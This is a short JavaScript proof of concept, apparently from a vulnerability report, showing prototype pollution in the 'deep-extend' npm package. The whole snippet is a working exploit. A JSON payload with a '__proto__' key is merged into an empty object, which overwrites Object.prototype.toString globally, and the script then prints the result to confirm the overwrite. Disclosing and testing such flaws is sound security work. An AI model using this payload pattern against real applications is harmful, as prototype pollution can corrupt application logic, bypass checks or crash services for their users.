var a = require('deep-extend');
var malicious_payload = '{"__proto__":{"toString":"It works !"}}';
a({}, JSON.parse(malicious_payload));
console.log({}.toString)
